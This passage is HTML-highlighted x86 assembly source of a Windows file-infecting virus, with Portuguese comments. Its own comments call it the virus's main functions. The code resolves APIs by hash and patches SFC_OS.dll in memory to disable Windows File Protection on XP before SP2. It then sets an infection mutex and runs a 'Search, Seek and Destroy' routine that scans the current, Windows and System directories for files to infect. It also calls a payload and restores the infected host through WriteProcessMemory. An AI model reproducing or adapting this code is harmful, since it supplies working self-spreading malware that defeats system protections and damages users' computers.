</span><span class="sc5">_APIs_fim</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">                </span><span class="sc1">; ESI = Ponteiro para a tabela</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">                </span><span class="sc1">; ECX = Número de APIs</span><span class="sc0">
</span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">api_addrs</span><span class="sc4">-</span><span class="sc5">delta</span><span class="sc4">]</span><span class="sc1">; EDI = Ponteiro para area de armazenar endereços</span><span class="sc0">

</span><span class="sc5">api_loop</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">lodsd</span><span class="sc0">             </span><span class="sc1">; Carrega CRC32 em EAX</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">AchaAPI</span><span class="sc0">      </span><span class="sc1">; Manda achar a API</span><span class="sc0">
</span><span class="sc6">stosd</span><span class="sc0">             </span><span class="sc1">; Salva endereço em [EDI]</span><span class="sc0">
</span><span class="sc6">loop</span><span class="sc0"> </span><span class="sc5">api_loop</span><span class="sc0">     </span><span class="sc1">; Loop ;)</span><span class="sc0">

</span><span class="sc1">; ---- Carrega SFC ----</span><span class="sc0">

</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">pos_sfc</span><span class="sc0">                 </span><span class="sc1">; String "SFC" na stack</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"SFC"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">pos_sfc</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc5">api</span><span class="sc0"> </span><span class="sc5">LoadLibraryA</span><span class="sc0">             </span><span class="sc1">; Carrega dll...</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">sfc_dll</span><span class="sc4">-</span><span class="sc5">delta</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">  </span><span class="sc1">; Guarda o endereço</span><span class="sc0">

</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">pos_sfcnome</span><span class="sc0">             </span><span class="sc1">; String "SfcIsFileProtected" na stack</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"SfcIsFileProtected"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">pos_sfcnome</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                     </span><span class="sc1">; Endereço da dll</span><span class="sc0">
</span><span class="sc5">api</span><span class="sc0"> </span><span class="sc5">GetProcAddress</span><span class="sc0">           </span><span class="sc1">; Pega endereço da função...</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">sfc_func</span><span class="sc4">-</span><span class="sc5">delta</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc1">; Salva endereço da função...</span><span class="sc0">
</span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">                   </span><span class="sc1">; EAX = 0 ?</span><span class="sc0">
</span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">mutex_rnd</span><span class="sc0">                 </span><span class="sc1">; Não tenta desativar SFC...</span><span class="sc0">

</span><span class="sc1">; ---- Verifica se pode-se desativar o SFC ----</span><span class="sc0">

</span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">          </span><span class="sc1">; EAX = 0</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">PAGE_READWRITE</span><span class="sc0">  </span><span class="sc1">; Protect</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">MEM_COMMIT_RESERVE</span><span class="sc0"> </span><span class="sc1">; AllocationType</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">SZ_OSVERSIONINFO</span><span class="sc0"> </span><span class="sc1">; Size</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">             </span><span class="sc1">; Address</span><span class="sc0">
</span><span class="sc5">api</span><span class="sc0"> </span><span class="sc5">VirtualAlloc</span><span class="sc0">     </span><span class="sc1">; Aloca...</span><span class="sc0">
</span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">           </span><span class="sc1">; EAX = 0 ?</span><span class="sc0">
</span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">mutex_rnd</span><span class="sc0">         </span><span class="sc1">; Então vaza...</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">         </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">SZ_OSVERSIONINFO</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">            </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">            </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc6">stosd</span><span class="sc0">               </span><span class="sc1">;</span><span class="sc0">

</span><span class="sc5">api</span><span class="sc0"> </span><span class="sc5">GetVersionExA</span><span class="sc0">   </span><span class="sc1">; Pega informações de versão...</span><span class="sc0">

</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                        </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">                    </span><span class="sc1">; EBX = EAX</span><span class="sc0">
</span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">eax.dwMajorVersion</span><span class="sc4">],</span><span class="sc2">5</span><span class="sc0">     </span><span class="sc1">; MajorVersion = 5 ?</span><span class="sc0">
</span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">sfcxp_libera</span><span class="sc0">               </span><span class="sc1">; Não? Então vaza...</span><span class="sc0">
</span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">eax.dwMinorVersion</span><span class="sc4">]</span><span class="sc0">       </span><span class="sc1">; MinorVersion = 1 ?</span><span class="sc0">
</span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">sfcxp_libera</span><span class="sc0">               </span><span class="sc1">; Não? Então vaza...</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">dwo</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">eax.szCSDVersion</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; Tem SP2 ?</span><span class="sc0">
</span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">                     </span><span class="sc1">; Sim?</span><span class="sc0">
</span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">sfcxp_libera</span><span class="sc0">               </span><span class="sc1">; Então vaza...</span><span class="sc0">

</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">            </span><span class="sc1">; Salva EBX</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">FerraXPSFC</span><span class="sc0">     </span><span class="sc1">; Desabilita SFC...</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">             </span><span class="sc1">; Recupera EBX</span><span class="sc0">

</span><span class="sc5">sfcxp_libera</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">MEM_RELEASE</span><span class="sc0">    </span><span class="sc1">; FreeType</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">            </span><span class="sc1">; Size</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">            </span><span class="sc1">; Address</span><span class="sc0">
</span><span class="sc5">api</span><span class="sc0"> </span><span class="sc5">VirtualFree</span><span class="sc0">     </span><span class="sc1">; Libera memoria...</span><span class="sc0">

</span><span class="sc1">; ---- Mutex &amp; Random Seed ----</span><span class="sc0">
</span><span class="sc5">mutex_rnd</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">              </span><span class="sc1">; EAX = 0</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">@@mutex_name</span><span class="sc0">        </span><span class="sc1">; Endereço para o nome do mutex na stack</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"For my sweet Djinn"</span><span class="sc0">  </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                     </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">@@mutex_name</span><span class="sc4">:</span><span class="sc0">            </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                 </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                 </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">api</span><span class="sc0"> </span><span class="sc5">CreateMutexA</span><span class="sc0">         </span><span class="sc1">; cria mutex...</span><span class="sc0">

</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">seed</span><span class="sc0">                </span><span class="sc1">; Gera uma random seed...</span><span class="sc0">

</span><span class="sc1">; ---- Funções principais do virus ----</span><span class="sc0">

</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">PerProc</span><span class="sc0">             </span><span class="sc1">; * Per-Process Resindency</span><span class="sc0">

</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">SSD</span><span class="sc0">                 </span><span class="sc1">; * Search &amp; Seek &amp; Destroy ;D</span><span class="sc0">

</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">Payload</span><span class="sc0">             </span><span class="sc1">; * Payload</span><span class="sc0">

</span><span class="sc1">; ---- Descarrega SFC ----</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">sfc_dll</span><span class="sc4">-</span><span class="sc5">delta</span><span class="sc4">]</span><span class="sc0">      </span><span class="sc1">; EAX = Handle de "SFC.DLL"</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                         </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">api</span><span class="sc0"> </span><span class="sc5">FreeLibrary</span><span class="sc0">                  </span><span class="sc1">; Libera DLL...</span><span class="sc0">

</span><span class="sc1">; ---- Conserta o hospedeiro ----</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc5">dwo</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">host_org</span><span class="sc4">-</span><span class="sc5">delta</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; ECX = 4 primeiros bytes originais do hosp.</span><span class="sc0">
</span><span class="sc6">jecxz</span><span class="sc0"> </span><span class="sc5">termina_tudo</span><span class="sc0">               </span><span class="sc1">; ECX = 0 ? Então é primeira geração... vaza.</span><span class="sc0">

</span><span class="sc5">conserta</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc5">api</span><span class="sc0"> </span><span class="sc5">GetCurrentProcess</span><span class="sc0">        </span><span class="sc1">; Pega uma pseudo-handle pro nosso processo</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc5">REGS_FLAGS</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">; EDI = Endereço de retorno...</span><span class="sc0">
</span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc2">5</span><span class="sc0">                    </span><span class="sc1">; EDI-= 5</span><span class="sc0">
</span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">host_org</span><span class="sc4">-</span><span class="sc5">delta</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; ESI = Bytes originais do hospedeiro</span><span class="sc0">

</span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">                     </span><span class="sc1">; lpNumberOfBytesWritten</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">5</span><span class="sc0">                       </span><span class="sc1">; nSize</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">                     </span><span class="sc1">; lpBuffer</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">                     </span><span class="sc1">; lpBaseAddress</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                     </span><span class="sc1">; hProcess</span><span class="sc0">
</span><span class="sc5">api</span><span class="sc0"> </span><span class="sc5">WriteProcessMemory</span><span class="sc0">       </span><span class="sc1">; Escreve... ;)</span><span class="sc0">
</span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">                 </span><span class="sc1">; ERRO ? Nem pensar !</span><span class="sc0">
</span><span class="sc6">jecxz</span><span class="sc0"> </span><span class="sc5">conserta</span><span class="sc0">               </span><span class="sc1">; Tenta denovo...</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc5">REGS_FLAGS</span><span class="sc4">],</span><span class="sc8">edi</span><span class="sc0">     </span><span class="sc1">; Troca o endereço de retorno...</span><span class="sc0">
</span><span class="sc6">popad</span><span class="sc0">                        </span><span class="sc1">; Recupera todos os regs.</span><span class="sc0">
</span><span class="sc6">popfd</span><span class="sc0">                        </span><span class="sc1">; Recupera flags...</span><span class="sc0">

</span><span class="sc1">; ---- Finaliza e volta pro hospedeiro ----</span><span class="sc0">

</span><span class="sc5">termina_tudo</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">ret</span><span class="sc0">                          </span><span class="sc1">; Retorna...</span><span class="sc0">

</span><span class="sc1">; -----------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;            Desabilita SFC no WinXP sem Service Pack 2</span><span class="sc0">
</span><span class="sc1">; -----------------------------------------------------------------</span><span class="sc0">

</span><span class="sc5">FerraXPSFC</span><span class="sc0"> </span><span class="sc9">proc</span><span class="sc0">

</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">@xp_sfcn</span><span class="sc0">                   </span><span class="sc1">; nome da dll na stack "SFC_OS"(.dll)</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"SFC_OS"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">                   </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">@xp_sfcn</span><span class="sc4">:</span><span class="sc0">                       </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">api</span><span class="sc0"> </span><span class="sc5">GetModuleHandleA</span><span class="sc0">            </span><span class="sc1">; pega Handle...</span><span class="sc0">
</span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">                    </span><span class="sc1">; Troca EAX com ECX...</span><span class="sc0">
</span><span class="sc6">jecxz</span><span class="sc0"> </span><span class="sc5">ferrasfc_fim</span><span class="sc0">              </span><span class="sc1">; ECX = 0 ? Então vaza...</span><span class="sc0">

</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">0EEB8h</span><span class="sc0">                  </span><span class="sc1">; EAX + VA do codigo que vamos mudar...</span><span class="sc0">

</span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">FH</span><span class="sc4">-</span><span class="sc5">delta</span><span class="sc4">]</span><span class="sc0">          </span><span class="sc1">; EBX = Ponteiro para armazenarmos Oldprotection</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                        </span><span class="sc1">; Salva EAX!</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">                        </span><span class="sc1">; Salva EBX!</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">                        </span><span class="sc1">; Oldprotect</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">PAGE_EXECUTE_READWRITE</span><span class="sc0">     </span><span class="sc1">; Newprotect</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">                          </span><span class="sc1">; Size</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                        </span><span class="sc1">; Address</span><span class="sc0">
</span><span class="sc5">api</span><span class="sc0"> </span><span class="sc5">VirtualProtect</span><span class="sc0">              </span><span class="sc1">; (UN)Protect...</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">                         </span><span class="sc1">; Recupera EBX!</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">                         </span><span class="sc1">; Recupera EAX em EDI!</span><span class="sc0">
</span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">                    </span><span class="sc1">; Troca EAX com ECX</span><span class="sc0">
</span><span class="sc6">jecxz</span><span class="sc0"> </span><span class="sc5">ferrasfc_fim</span><span class="sc0">              </span><span class="sc1">; ECX = 0 ? Então vaza...</span><span class="sc0">

</span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc5">wod</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc2">561Bh</span><span class="sc0">             </span><span class="sc1">; Muda 8BC6 (mov eax,esi) para 9090 (nop/nop)</span><span class="sc0">

</span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Mem</span><span class="sc4">-</span><span class="sc5">delta</span><span class="sc4">]</span><span class="sc0">         </span><span class="sc1">; EAX = Ponteiro exigido pela api</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc8">ebx</span><span class="sc4">]</span><span class="sc0">                   </span><span class="sc1">; EBX = Antigo valor de proteção da página</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                        </span><span class="sc1">; OldProtect</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">                        </span><span class="sc1">; NewProtect</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">                          </span><span class="sc1">; Size</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">                        </span><span class="sc1">; Address</span><span class="sc0">
</span><span class="sc5">api</span><span class="sc0"> </span><span class="sc5">VirtualProtect</span><span class="sc0">              </span><span class="sc1">; Protect...</span><span class="sc0">

</span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">                     </span><span class="sc1">; EAX = 0</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">sfc_func</span><span class="sc4">-</span><span class="sc5">delta</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">    </span><span class="sc1">; SFC_FUNC = EAX</span><span class="sc0">

</span><span class="sc5">ferrasfc_fim</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">ret</span><span class="sc0">                             </span><span class="sc1">; Retorna...</span><span class="sc0">

</span><span class="sc5">FerraXPSFC</span><span class="sc0"> </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc1">; -----------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;                  Search, Seek and Destroy</span><span class="sc0">
</span><span class="sc1">; -----------------------------------------------------------------</span><span class="sc0">

</span><span class="sc1">; --- Função principal ----</span><span class="sc0">

</span><span class="sc5">SSD</span><span class="sc0"> </span><span class="sc9">proc</span><span class="sc0">

</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">AlocaW32FD</span><span class="sc0">             </span><span class="sc1">; Aloca memória para WIN32_FIND_DATA e diretórios</span><span class="sc0">
</span><span class="sc6">jecxz</span><span class="sc0"> </span><span class="sc5">ssd_fim</span><span class="sc0">               </span><span class="sc1">; ECX = 0 ? Então vaza pq falhamos...</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">busca</span><span class="sc4">-</span><span class="sc5">delta</span><span class="sc4">]</span><span class="sc0">   </span><span class="sc1">; EDI = Ponteiro para memoria virtual</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc5">SZ_WIN32_FIND_DATA</span><span class="sc0">  </span><span class="sc1">; EDI + WIN32_FIND_DATA</span><span class="sc0">

</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">                    </span><span class="sc1">; Buffer para o diretorio</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">105h</span><span class="sc0">                   </span><span class="sc1">; Tamanho do buffer</span><span class="sc0">
</span><span class="sc5">api</span><span class="sc0"> </span><span class="sc5">GetCurrentDirectoryA</span><span class="sc0">    </span><span class="sc1">; Pega diretorio atual...</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc2">105h</span><span class="sc0">                </span><span class="sc1">; Anda com EDI...</span><span class="sc0">

</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">105h</span><span class="sc0">                   </span><span class="sc1">; Buffer para o diretorio</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">                    </span><span class="sc1">; Tamanho do buffer</span><span class="sc0">
</span><span class="sc5">api</span><span class="sc0"> </span><span class="sc5">GetWindowsDirectoryA</span><span class="sc0">    </span><span class="sc1">; Pega diretorio do windows...</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc2">105h</span><span class="sc0">                </span><span class="sc1">; Anda com EDI...</span><span class="sc0">

</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">105h</span><span class="sc0">                   </span><span class="sc1">; Buffer para o diretorio</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">                    </span><span class="sc1">; Tamanho do buffer</span><span class="sc0">
</span><span class="sc5">api</span><span class="sc0"> </span><span class="sc5">GetSystemDirectoryA</span><span class="sc0">     </span><span class="sc1">; Pega diretorio do sistema...</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc2">105h</span><span class="sc0">                </span><span class="sc1">; Anda com EDI...</span><span class="sc0">

</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">mbusca</span><span class="sc0">                 </span><span class="sc1">; Diretório atual</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">mbusca</span><span class="sc0">                 </span><span class="sc1">; Diretório de sistema</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">mbusca</span><span class="sc0">                 </span><span class="sc1">; Diretório do windows</span><span class="sc0">

</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">LiberaW32FD</span><span class="sc0">            </span><span class="sc1">; Libera memória...</span><span class="sc0">

</span><span class="sc5">ssd_fim</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">ret</span><span class="sc0">                         </span><span class="sc1">; Retorna...</span><span class="sc0">

</span><span class="sc1">; --- Sub-função: Busca arquivos e muda de diretório...</span><span class="sc0">
</span><span class="sc5">mbusca</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">                    </span><span class="sc1">; Salva EDI !</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">BuscaCDIR</span><span class="sc0">              </span><span class="sc1">; Busca arquivos no diretório corrente...</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">                     </span><span class="sc1">; Recupera EDI !</span><span class="sc0">

</span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc2">105h</span><span class="sc0">                </span><span class="sc1">; Subtrai EDI...</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">                    </span><span class="sc1">; Buffer</span><span class="sc0">
</span><span class="sc5">api</span><span class="sc0"> </span><span class="sc5">SetCurrentDirectoryA</span><span class="sc0">    </span><span class="sc1">; Seta diretorio...</span><span class="sc0">
</span><span class="sc6">ret</span><span class="sc0">                         </span><span class="sc1">; Retorna...</span><span class="sc0">

</span><span class="sc5">SSD</span><span class="sc0"> </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc1">; --- Sub-função: Aloca memória para o W32FD</span><span class="sc0">

</span><span class="sc5">AlocaW32FD</span><span class="sc0"> </span><span class="sc9">proc</span><span class="sc0">
</span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">          </span><span class="sc1">; EAX = 0</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">PAGE_READWRITE</span><span class="sc0">  </span><span class="sc1">; Protect</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">MEM_COMMIT_RESERVE</span><span class="sc0"> </span><span class="sc1">; AllocationType</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">SZ_WIN32_FIND_DATA</span><span class="sc4">+</span><span class="sc2">1000h</span><span class="sc0"> </span><span class="sc1">; Size</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">             </span><span class="sc1">; Address</span><span class="sc0">
</span><span class="sc5">api</span><span class="sc0"> </span><span class="sc5">VirtualAlloc</span><span class="sc0">     </span><span class="sc1">; Aloca...</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">busca</span><span class="sc4">-</span><span class="sc5">delta</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">  </span><span class="sc1">; Salva ponteiro ! ;D</span><span class="sc0">
</span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">         </span><span class="sc1">; Troca EAX com ECX...</span><span class="sc0">
</span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">AlocaW32FD</span><span class="sc0"> </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc1">; --- Sub-função: Libera memória alocada para o W32FD</span><span class="sc0">

</span><span class="sc5">LiberaW32FD</span><span class="sc0"> </span><span class="sc9">proc</span><span class="sc0">
</span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">         </span><span class="sc1">; EAX = 0</span><span class="sc0">
